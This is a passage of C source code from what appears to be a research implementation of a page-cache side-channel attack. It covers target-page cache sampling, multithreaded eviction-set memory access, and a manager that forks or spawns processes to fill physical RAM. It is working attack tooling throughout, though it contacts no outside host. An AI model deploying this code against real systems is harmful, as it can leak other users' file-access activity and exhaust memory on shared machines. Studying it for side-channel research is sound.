            if (adviseFileUsage(&current_target_file.mapping_, 0, 0, USAGE_RANDOM) != 0)
            {
                DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
            }

            // parse pages next
            parse_pages = 1;
        }
    }

    goto cleanup;
error:
    ret = -1;
    hashMapDestroy(&attack->targets_, closeTargetFile);
cleanup:
    if (targets_config_file != NULL)
    {
        fclose(targets_config_file);
    }
    closeTargetFile(&current_target_file);

    return ret;
}

// for single page hit tracing
int fcaTargetsSampleFlushOnce(Attack *attack)
{
    int ret = 0;
    ssize_t accessed_memory = 0;

    ret = targetsSampleShouldEvict(attack);
    if (ret == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at targetsSampleShouldEvict...\n", OSAL_EC));
        return -1;
    }
    // nothing to evict
    else if (ret == 0)
    {
        return 0;
    }
    // we should evict
    accessed_memory = evictTargets(attack, targetsEvicted, attack);
    if (accessed_memory < 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at evictTargets...\n", OSAL_EC));
        return -1;
    }
    else if (accessed_memory == 0)
    {
        errno = EAGAIN;
        DEBUG_PRINT((DEBUG FAIL "Error: Eviction was not possible!\n"));
        return -1;
    }

    return 1;
}

// teardown
void fcaExit(Attack *attack)
{
    // stop all threads + free attack object
    freeAttack(attack);
}

/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR PUBLIC ATTACK FUNCTIONS
 */
int targetsHmCacheStatusCB(void *data, void *arg)
{
    uint64_t evict_mode = (uint64_t)arg;
    TargetFile *target_file = data;

    if(target_file->has_target_pages_)
    {
        TargetPage *target_pages = target_file->target_pages_.data_;
        for (size_t i = 0; i < target_file->target_pages_.size_; i++)
        {
            // save sample time + sample
            if(evict_mode == 0)
            {
                target_pages[i].last_sample_time_ = osal_unix_ts_us();
            }
            if (getCacheStatusFileRange(&target_file->mapping_, target_pages[i].offset_ * PAGE_SIZE, PAGE_SIZE) != 0)
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFileRange...\n", OSAL_EC));
                return -1;
            }
            // stop if wanted
            if (evict_mode == 1 &&
                target_file->mapping_.pages_cache_status_[target_pages[i].offset_] == 1)

            {
                // page is still in page cache -> stop
                return HM_FE_BREAK;
            }
        }
    }
    else if(target_file->has_target_sequence_)
    {
        size_t offset_in_pages = target_file->target_sequence_.offset_;
        size_t length_in_pages = target_file->target_sequence_.length_;

        if(evict_mode == 0)
        {
            target_file->last_sample_time_ = osal_unix_ts_us();
        }
        if (getCacheStatusFileRange(&target_file->mapping_, offset_in_pages * PAGE_SIZE, length_in_pages * PAGE_SIZE) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
            return -1;
        }
        // stop if wanted
        if (evict_mode == 1 && 
            fcaCountCachedPages(target_file->mapping_.pages_cache_status_ + offset_in_pages, length_in_pages) != 0)
        {
            // (part of) file is still in page cache -> stop
            return HM_FE_BREAK;
        }
    }
    else if(target_file->is_target_file_)
    {
        if(evict_mode == 0)
        {
            target_file->last_sample_time_ = osal_unix_ts_us();
        }
        if (getCacheStatusFile(&target_file->mapping_) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
            return -1;
        }
        if (evict_mode == 1 &&
            fcaCountCachedPages(target_file->mapping_.pages_cache_status_, target_file->mapping_.size_pages_) != 0)
        {
            // (part of) file is still in page cache -> stop
            return HM_FE_BREAK;
        }
    }
    else 
    {
        // TODO FIXME page sequences currently not supported as not needed
        return -1;
    }

    // copy fc status
    if(evict_mode == 0)
    {
        memcpy(target_file->last_sample_fc_status_, target_file->mapping_.pages_cache_status_, target_file->mapping_.size_pages_ * sizeof(uint8_t));
    }

    return HM_FE_OK;
}

int targetsEvicted(void *arg)
{
    Attack *attack = arg;
    if (hashMapForEach(&attack->targets_, targetsHmCacheStatusCB, (void *) 1) == HM_FE_OK)
    {
        return 1;
    }

    return 0;
}

int targetsHmShouldEvictCB(void *data, void *arg)
{
    (void)arg;
    TargetFile *target_file = data;
    
    if(target_file->has_target_pages_)
    {
        TargetPage *target_pages = target_file->target_pages_.data_;
        for (size_t i = 0; i < target_file->target_pages_.size_; i++)
        {
            // evict if a page is in pc for which eviction should be triggered
            if (!target_pages[i].no_eviction_ &&
                target_file->mapping_.pages_cache_status_[target_pages[i].offset_] == 1)

            {
                return HM_FE_BREAK;
            }
        }
    }
    else if(target_file->has_target_sequence_)
    {
        size_t offset_in_pages = target_file->target_sequence_.offset_;
        size_t length_in_pages = target_file->target_sequence_.length_;

        if(fcaCountCachedPages(target_file->mapping_.pages_cache_status_ + offset_in_pages, length_in_pages) != 0)
        {
            // (part of) file is still in page cache -> stop
            return HM_FE_BREAK;
        }
    }
    else if(target_file->is_target_file_)
    {
        if (fcaCountCachedPages(target_file->mapping_.pages_cache_status_, target_file->mapping_.size_pages_) != 0)
        {
            // (part of) file is still in page cache -> stop
            return HM_FE_BREAK;
        }
    }
    else 
    {
        // TODO FIXME page sequences currently not supported as not needed
        return -1;
    }

    return HM_FE_OK;
}

int targetsSampleShouldEvict(Attack *attack)
{
    // sample all pages of interest
    if (hashMapForEach(&attack->targets_, targetsHmCacheStatusCB, 0) != HM_FE_OK)
    {
        return -1;
    }
    // check if eviction is needed
    if (hashMapForEach(&attack->targets_, targetsHmShouldEvictCB, 0) == HM_FE_BREAK)
    {
        return 1;
    }

    return 0;
}

/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK EVICTION SET
 */

// creation of eviction set
int createEvictionSet(Attack *attack)
{
    int ret = 0;
    AttackEvictionSet *es = &attack->eviction_set_;

    // file eviction set
    if (!es->use_anon_memory_)
    {
        // create file
        ret = createRandomFile(es->eviction_file_path_, TOTAL_MEMORY_BYTES);
        if (ret != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at createRandomFile...\n", OSAL_EC));
            goto error;
        }
        // get absolute path
        es->eviction_file_path_abs_ = calloc(OSAL_MAX_PATH_LEN, sizeof(char));
        if (es->eviction_file_path_abs_ == NULL)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at calloc...\n", OSAL_EC));
            goto error;
        }
        if (osal_fullpath(es->eviction_file_path_, es->eviction_file_path_abs_) == NULL)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at osal_fullpath...\n", OSAL_EC));
            goto error;
        }
        // map eviction file
        if (mapFile(&es->mapping_, es->eviction_file_path_abs_,
                    FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ | MAPPING_ACCESS_EXECUTE) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC,
                         es->eviction_file_path_abs_));
            goto error;
        }
    }
    else
    {
        // anonymous eviction set
        if (mapAnon(&es->mapping_, TOTAL_MEMORY_BYTES, MAPPING_PRIVATE | MAPPING_ACCESS_READ | MAPPING_ACCESS_WRITE | MAPPING_ACCESS_EXECUTE | MAPPING_NORESERVE) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapAnon...\n", OSAL_EC));
            goto error;
        }
        // allocate huge pages if possible (less allocation overhead)
        // no significant benefitial effect
        /*if (adviseFileUsage(&attack->eviction_set_.mapping_, 0, 0, USAGE_HUGEPAGE) != 0)
        {
            DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
        }*/
    }

    return 0;
error:
    closeFileMapping(&es->mapping_);
    return -1;
}

ssize_t evictTargets(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr)
{
    ssize_t accessed_memory = 0;
    uint64_t start_cycle = 0, end_cycle = 0;

    // single thread
    if (!attack->eviction_set_.use_access_threads_)
    {
        TSC_BENCH_START(start_cycle);
        accessed_memory = evictTargets_(attack, targets_evicted_fn, target_evicted_arg_ptr);
        TSC_BENCH_STOP(end_cycle);
    }
    // multiple threads
    else
    {
        TSC_BENCH_START(start_cycle);
        accessed_memory = evictTargetsThreads_(attack, targets_evicted_fn, target_evicted_arg_ptr);
        TSC_BENCH_STOP(end_cycle);
    }

    // save public statistics
    attack->eviction_set_.last_eviction_accessed_memory_bytes_ = accessed_memory;
    attack->eviction_set_.last_eviction_time_ns_ = tsc_bench_get_runtime_ns(start_cycle, end_cycle);

    return accessed_memory;
}

ssize_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr)
{
    ssize_t accessed_mem = 0;

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);
    accessed_mem = evictTargets__(attack, targets_evicted_fn, targets_evicted_arg_ptr, 0, attack->eviction_set_.mapping_.size_);
    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

    return accessed_mem;
}

ssize_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr)
{
    int eviction_result = 1;
    ssize_t accessed_mem_sum = 0;

    // reset memory
    attack->eviction_set_.workers_targets_evicted_ = 0;

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);
    // resume worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG ES_TAG FAIL "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
            return -1;
        }
    }

    // eviction is running

    // wait for completion of the worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG ES_TAG FAIL "Error " OSAL_EC_FS " at sem_wait...\n", OSAL_EC));
            return -1;
        }
    }
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);
    // get worker thread data
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        if (thread_data->accessed_mem_ == -1)
        {
            eviction_result = -1;
        }
        else if (thread_data->accessed_mem_ == 0)
        {
            eviction_result = 0;
        }
        else
        {
            accessed_mem_sum += thread_data->accessed_mem_;
        }
    }

    return (eviction_result == 1) ? accessed_mem_sum : eviction_result;
}

int spawnESThreads(Attack *attack)
{
    int ret = 0;
    size_t pos = 0;
    size_t pages_per_thread_floor = attack->eviction_set_.mapping_.size_pages_ / attack->eviction_set_.access_thread_count_;
    size_t access_range_per_thread = pages_per_thread_floor * PAGE_SIZE;

    //  reserve space for access thread data structures
    if (dynArrayResize(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_) == NULL)
    {
        DEBUG_PRINT((DEBUG ES_TAG FAIL "Error " OSAL_EC_FS " at dynArrayResize...\n", OSAL_EC));
        goto error;
    }

    // prepare thread_data objects
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_ - 1; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        initPageAccessThreadESData(thread_data);
        thread_data->running_ = 1;
        thread_data->attack_ = attack;
        thread_data->access_offset_ = pos;
        thread_data->access_len_ = access_range_per_thread;
        thread_data->start_sem_ = &attack->eviction_set_.worker_start_sem_;
        thread_data->join_sem_ = &attack->eviction_set_.worker_join_sem_;
        thread_data->targets_evicted_fn_ = targetsEvictedEsThreadsFn;
        thread_data->targets_evicted_arg_ptr_ = attack;
        pos += access_range_per_thread;
    }
    // prepare thread_data object for last thread
    PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_ - 1);
    initPageAccessThreadESData(thread_data);
    thread_data->running_ = 1;
    thread_data->attack_ = attack;
    thread_data->access_offset_ = pos;
    thread_data->access_len_ = attack->eviction_set_.mapping_.size_ - pos;
    thread_data->start_sem_ = &attack->eviction_set_.worker_start_sem_;
    thread_data->join_sem_ = &attack->eviction_set_.worker_join_sem_;
    thread_data->targets_evicted_fn_ = targetsEvictedEsThreadsFn;
    thread_data->targets_evicted_arg_ptr_ = attack;

    // spin up worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadES, thread_data) != 0)
        {
            thread_data->running_ = 0;
            DEBUG_PRINT((DEBUG ES_TAG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
            goto error;
        }
    }

    goto cleanup;
error:
    ret = -1;
    dynArrayDestroy(&attack->eviction_set_.access_threads_, closePageAccessThreadESData);
cleanup:

    return ret;
}

int targetsEvictedEsThreadsFn(void *arg)
{
    Attack *attack = arg;
    // we have multiple threads which access this function
    // but only one should carry out the actual check at one time
 
    // last result says already that we are evicted -> stop immediately
    if(__atomic_load_n(&attack->eviction_set_.workers_targets_evicted_, __ATOMIC_RELAXED))
    {
        return 1;
    }
 
    // ok, check if we can get the lock 

    // did not work -> to aggressive?
    //if(pthread_mutex_trylock(&attack->eviction_set_.workers_targets_check_lock_) == 0)
    
    if(pthread_mutex_lock(&attack->eviction_set_.workers_targets_check_lock_) == 0)
    {
        // we have the lock check
        if (hashMapForEach(&attack->targets_, targetsHmCacheStatusCB, (void *) 1) == HM_FE_OK)
        {
            __atomic_store_n(&attack->eviction_set_.workers_targets_evicted_, 1, __ATOMIC_RELAXED);
            pthread_mutex_unlock(&attack->eviction_set_.workers_targets_check_lock_);
            return 1;
        }
        else 
        {
            pthread_mutex_unlock(&attack->eviction_set_.workers_targets_check_lock_);
            return 0;
        }
    }

    // could not get lock, just behave like target is still cached
    return 0;
}

void *pageAccessThreadES(void *arg)
{
    PageAccessThreadESData *thread_data = arg;
    Attack *attack = thread_data->attack_;
    ssize_t accessed_mem = 0;

    DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG INFO "Worker thread (offset: %zu, max. bytes: %zu) spawned.\n",
                 pthread_self(), thread_data->access_offset_, thread_data->access_len_));
    while (__atomic_load_n(&thread_data->running_, __ATOMIC_RELAXED))
    {
        if (sem_wait(thread_data->start_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG FAIL "Error " OSAL_EC_FS " at sem_wait (%p)...\n", pthread_self(),
                         OSAL_EC, (void *)thread_data->start_sem_));
            goto error;
        }

        accessed_mem = evictTargets__(attack, thread_data->targets_evicted_fn_, thread_data->targets_evicted_arg_ptr_, thread_data->access_offset_, thread_data->access_len_);
        /*DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG INFO "Worker thread (offset: %zu, max. bytes: %zu) accessed %zu kB.\n", pthread_self(),
                     thread_data->access_offset_, thread_data->access_len_, accessed_mem / 1024));*/
        thread_data->accessed_mem_ = accessed_mem;

        if (sem_post(thread_data->join_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG FAIL "Error " OSAL_EC_FS " at sem_post (%p)...\n", pthread_self(),
                         OSAL_EC, (void *)thread_data->join_sem_));
            goto error;
        }
    }
    DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG INFO "Worker thread stopped.\n", pthread_self()));

    return NULL;

error:

    return (void *)-1;
}

ssize_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr,
                       size_t access_offset, size_t access_len)
{
    volatile uint8_t tmp = 0;
    (void)tmp;
    size_t accessed_mem = 0;
    int targets_evicted = 0;

    while (!targets_evicted) 
    {
        // access memory
        // accessed memory can never be zero in case of eviction
        for (size_t pos = access_offset; pos < (access_offset + access_len); pos += PAGE_SIZE)
        {
            // access ws
            if (attack->use_attack_ws_ && attack->eviction_set_.ws_access_all_x_bytes_ != 0 &&
                accessed_mem % attack->eviction_set_.ws_access_all_x_bytes_ == 0)
            {
                //uint64_t cycle_start, cycle_end;
                //TSC_BENCH_START(cycle_start);
                pthread_rwlock_rdlock(&attack->working_set_.ws_lists_lock_);
                activateWS(attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].head_,
                        attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_,
                        attack);
                pthread_rwlock_unlock(&attack->working_set_.ws_lists_lock_);
                //TSC_BENCH_STOP(cycle_end);
                // uint64_t time_ns = tsc_bench_get_runtime_ns(cycle_start, cycle_end);
                // printf("Took %zu\n", time_ns);
            }

            // access ss
            if (attack->use_attack_ss_ && attack->eviction_set_.ss_access_all_x_bytes_ != 0 &&
                accessed_mem % attack->eviction_set_.ss_access_all_x_bytes_ == 0)
            {
                activateSS(&attack->suppress_set_.suppress_set_, attack->suppress_set_.use_file_api_);
            }

            // prefetch larger blocks (more efficient IO)
            if (attack->eviction_set_.prefetch_es_bytes_ != 0 && accessed_mem % attack->eviction_set_.prefetch_es_bytes_ == 0)
            {
                if (adviseFileUsage(&attack->eviction_set_.mapping_, pos,
                                    MIN(attack->eviction_set_.prefetch_es_bytes_, access_offset + access_len - pos), USAGE_WILLNEED) != 0)
                {
                    DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", pthread_self(), OSAL_EC));
                }
            }

            // access page
            // for anonymous memory write access is necessary to allocate memory
            if(attack->eviction_set_.use_anon_memory_) 
            {
                *((uint8_t *)attack->eviction_set_.mapping_.addr_ + pos) = 0xff;
            }
            else
            {
                // activate
                fileMappingActivate(&attack->eviction_set_.mapping_, pos, attack->eviction_set_.use_file_api_);
            }
            accessed_mem += PAGE_SIZE;

            // check if evicted
            if (accessed_mem % attack->eviction_set_.targets_check_all_x_bytes_ == 0 &&
                targets_evicted_fn(targets_evicted_arg_ptr))
            {
                targets_evicted = 1;
                break;
            }
        }
    }

    // remove eviction set to release pressure
    // useful also because then the eviction set is ensured to be added to the head of the 
    // of the inactive list again at next eviction as it is removed from file LRU (and RAM)
    if (adviseFileUsage(&attack->eviction_set_.mapping_, access_offset,
                        access_len, USAGE_DONTNEED) != 0)
    {
        DEBUG_PRINT((DEBUG ES_TAG WORKER_TAG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", pthread_self(), OSAL_EC));
    }

    return targets_evicted ? accessed_mem : 0;
}

/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK BLOCKING SET
 */

void *bsManagerThread(void *arg)
{
    Attack *attack = arg;
    AttackBlockingSet *bs = &attack->blocking_set_;
    size_t available_mem = 0;
    size_t mem_diff = 0;
    // set goal for available mem in middle of allowed region
    size_t available_mem_goal = bs->min_available_mem_ + (bs->max_available_mem_ - bs->min_available_mem_) / 2;

    DEBUG_PRINT((DEBUG BS_TAG INFO "BS manager thread started.\n"));
    while (__atomic_load_n(&bs->running_, __ATOMIC_RELAXED))
    {
        // do not evaluate during eviction in case of anonymous eviction set
        // (would be contra productive)
        if(attack->eviction_set_.use_anon_memory_ && __atomic_load_n(&eviction_running, __ATOMIC_RELAXED))
        {
            goto wait;
        }
        available_mem = parseAvailableMem(bs) * 1024;
        // do not act during eviction in case of anonymous eviction set
        // (would be contra productive)
        if(attack->eviction_set_.use_anon_memory_ && __atomic_load_n(&eviction_running, __ATOMIC_RELAXED))
        {
            goto wait;
        }
        
        DEBUG_PRINT((DEBUG BS_TAG INFO "%zu kB of physical memory available\n", available_mem / 1024));
        if (available_mem < bs->min_available_mem_)
        {
            mem_diff = available_mem_goal - available_mem;
            DEBUG_PRINT((DEBUG BS_TAG INFO "Too less physical memory available, trying to release %zu kB...\n",
                         mem_diff / 1024));
            releaseRAM(bs, mem_diff);
        }
        else if (available_mem > bs->max_available_mem_)
        {
            // * 3 / 4 for slower convergence (less overshoot)
            mem_diff = (available_mem - available_mem_goal) * 3 / 4;
            // blocking rounds down, only down when at least as big as one unit
            if (mem_diff >= bs->def_fillup_size_)
            {
                DEBUG_PRINT((DEBUG BS_TAG INFO "Too much physical memory available, trying to block %zu kB...\n",
                             mem_diff / 1024));
                blockRAM(bs, mem_diff);
            }
        }
        else if (!bs->initialized_)
        {
            while (sem_post(&bs->initialized_sem_) != 0)
            {
                DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at sem_post...\n",
                             OSAL_EC));
            }
            bs->initialized_ = 1;
        }

    wait:
        osal_sleep_us(bs->evaluation_sleep_time_us_);
    }

    return NULL;
}

#ifdef __linux
// sum of MemAvailable and SwapFree of /proc/meminfo
// in case of an error 0 is returned to free all memory and not deadlock the system
size_t parseAvailableMem(AttackBlockingSet *bs)
{
    FILE *meminfo_file = NULL;
    char line[LINE_MAX] = {0};
    ssize_t available_mem_kb = -1;
    ssize_t swap_free_kb = -1;

    // open meminfo file
    meminfo_file = fopen(FCA_LINUX_MEMINFO_PATH, "r");
    if (!meminfo_file)
    {
        DEBUG_PRINT((DEBUG BS_TAG WARNING "Available memory could not be parsed!\n"));
        DEBUG_PRINT((DEBUG BS_TAG WARNING "Returning 0!\n"));
        return 0;
    }

    // canary to see if line was longer as buffer
    line[FCA_IN_LINE_MAX - 1] = 'c';
    while (fgets(line, FCA_IN_LINE_MAX, meminfo_file))
    {
        // skip lines longer than 255
        if (line[FCA_IN_LINE_MAX - 1] == '\0')
        {
            continue;
        }

        if (strstr(line, FCA_LINUX_MEMINFO_AVAILABLE_MEM_TAG) != NULL)
        {
            available_mem_kb = lineParseMemValue(line, FCA_LINUX_MEMINFO_AVAILABLE_MEM_TAG);
            if(available_mem_kb == -1)
            {
                break;
            }
        }
        else if(strstr(line, FCA_LINUX_MEMINFO_SWAP_FREE_TAG) != NULL)
        {
            swap_free_kb = lineParseMemValue(line, FCA_LINUX_MEMINFO_SWAP_FREE_TAG);
            if(swap_free_kb == -1)
            {
                break;
            }
        }

        if(available_mem_kb != -1 && swap_free_kb != -1)
        {
            break;
        }
    }

    if (available_mem_kb == -1 || swap_free_kb == -1)
    {
        DEBUG_PRINT((DEBUG BS_TAG WARNING "Available memory could not be parsed!\n"));
        DEBUG_PRINT((DEBUG BS_TAG WARNING "Returning 0!\n"));
        return 0;
    }

    // cleanup
    fclose(meminfo_file);
    // in bytes
    return available_mem_kb + swap_free_kb;
}

// changes line !
ssize_t lineParseMemValue(char *line, char *tag)
{
    char *value_string_start = NULL;
    char *conversion_end = NULL;
    ssize_t value = 0;
    
    for (size_t c = strlen(tag); line[c] != 0; c++)
    {
        if (isdigit(line[c]))
        {
            if (value_string_start == NULL)
            {
                value_string_start = line + c;
            }
        }
        else if (value_string_start != NULL)
        {
            line[c] = 0;
            break;
        }
    }
    // not found
    if(value_string_start == NULL)
    {
        return -1;
    }

    // convert
    errno = 0;
    value = strtoul(value_string_start, &conversion_end, 10);
    if (*value_string_start == 0 || *conversion_end != 0 || errno == ERANGE || value < 0)
    {
        return -1;
    }

    return value;
}
#elif defined(_WIN32)
size_t parseAvailableMem(AttackBlockingSet *bs)
{
    (void)bs;
    GlobalMemoryStatusEx memory_status;

    if (!GlobalMemoryStatusEx(&memory_status))
    {
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Available memory could not be parsed!\n"));
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Returning 0!\n"));
        return 0;
    }

    return memory_status.ullAvailPhys + memory_status.ullAvailPageFile;
}
#endif

#ifdef __linux
int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
{
    int ret = 0;
    FillUpProcess child_process;
    void *fillup_mem = NULL;
    size_t needed_childs = 0;
    sem_t *sem = NULL;

    // init child structure
    initFillUpProcess(&child_process);
    child_process.fillup_size_ = bs->def_fillup_size_;

    // create a shared semaphore
    sem = mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sem == MAP_FAILED)
    {
        DEBUG_PRINT((DEBUG FAIL BS_TAG "Error " OSAL_EC_FS " at mmap...\n", OSAL_EC));
        goto error;
    }
    if (sem_init(sem, 1, 0) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL BS_TAG "Error " OSAL_EC_FS " at sem_init...\n", OSAL_EC));
        goto error;
    }

    // round down
    needed_childs = fillup_size / bs->def_fillup_size_;
    for (size_t i = 1; i <= needed_childs; i++)
    {
        child_process.pid_ = fork();

        if (child_process.pid_ < 0)
        {
            // parent
            DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at fork...\n", OSAL_EC));
            goto error;
        }
        else if (child_process.pid_ == 0)
        {
            // child
            #ifndef _DEBUG_
                fclose(stdout);
                fclose(stdin);
                fclose(stderr);
            #endif

            DEBUG_PRINT((DEBUG BS_TAG INFO "New child %zu with %zu kB dirty memory will be spawned...\n",
                         i, bs->def_fillup_size_ / 1024));

            fillup_mem = mmap(
                NULL, bs->def_fillup_size_, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);

            if (fillup_mem == MAP_FAILED)
            {
                while (sem_post(sem) != 0)
                {
                    DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
                }

                DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " mmap..\n", OSAL_EC));
                exit(-1);
            }

            // write to fillup memory (unique contents -> no page deduplication)
            for (size_t m = 0; m < bs->def_fillup_size_; m += PAGE_SIZE)
            {
                *((size_t *)((uint8_t *)fillup_mem + m)) = i * m;
            }

            // finished
            while (sem_post(sem) != 0)
            {
                DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
                exit(-1);
            }

            while (1)
            {
                // wait for signal
                pause();
            }
        }

        // parent
        // wait until child process has finished
        if (sem_wait(sem) != 0)
        {
            DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at sem_wait...\n", OSAL_EC));
            goto error;
        }

        // error at dynArrayAppend <=> child could not be added
        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
        {
            DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }
    }
    DEBUG_PRINT((DEBUG BS_TAG INFO "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024));

    goto cleanup;
error:
    ret = -1;
    // kill rouge child if existing
    if (child_process.pid_ != OSAL_PID_INVALID && child_process.pid_ != 0)
    {
        osal_process_kill(child_process.pid_);
    }

cleanup:
    if (sem != MAP_FAILED)
    {
        sem_destroy(sem);
        munmap(sem, sizeof(sem_t));
    }

    return ret;
}
#elif defined(_WIN32)
int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
{
    int ret = 0;
    FillUpProcess child_process;
    void *fillup_mem = NULL;
    size_t needed_childs = 0;
    HANDLE sem = NULL;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;

    // init child structure
    initFillUpProcess(&child_process);
    child_process.fillup_size_ = bs->def_fillup_size_;

    // prepare structures for process creation
    memset(&startup_info, 0, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    memset(&process_info, 0, sizeof(process_info));

    // create a inter-process semaphore
    sem = CreateSemaphoreA(NULL, 0, 1, FCA_WINDOWS_BS_SEMAPHORE_NAME);
    if (sem == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at CreateSemaphoreA\n", OSAL_EC));
        goto error;
    }

    // round down
    needed_childs = fillup_size / bs->def_fillup_size_;
    for (size_t i = 1; i <= needed_childs; i++)
    {
        // create fill up child process
        if (!CreateProcessA(module_path, FCA_WINDOWS_BS_COMMANDLINE, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                            NULL, NULL, &startup_info, &process_info))
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at CreateProcessA\n", OSAL_EC));
            goto error;
        }
        child_process.pid_ = process_info.hProcess;

        // parent
        // wait until child process has finished
        if (WaitForSingleObject(sem, INFINITE) == WAIT_FAILED)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at WaitForSingleObject\n", OSAL_EC));
            goto error;
        }

        // error at dynArrayAppend <=> child could not be added
        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
        {
            DEBUG_PRINT((DEBUG FAIL BS_TAG "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }
    }
    DEBUG_PRINT((DEBUG INFO BS_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024));

    goto cleanup;
error:
    ret = -1;
    // kill rouge child if existing
    if (child_process.pid_ > 0)
    {
        osal_process_kill(child_process.pid_);
    }

cleanup:
    if (sem != NULL)
    {
        CloseHandle(sem);
    }

    return ret;
}

int blockRAMChildWindows(AttackBlockingSet *bs)
{
    HANDLE sem = NULL;

    DEBUG_PRINT((DEBUG INFO "New child with %zu MB dirty memory spawned...\n", bs->def_fillup_size_ / 1024 / 1024));

    // open shared semaphore
    sem = OpenSemaphoreA(SYNCHRONIZE | SEMAPHORE_MODIFY_STATE, FALSE, FCA_WINDOWS_BS_SEMAPHORE_NAME);
    if (sem == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at OpenSemaphoreA\n", OSAL_EC));
        goto error;
    }

    // allocate memory
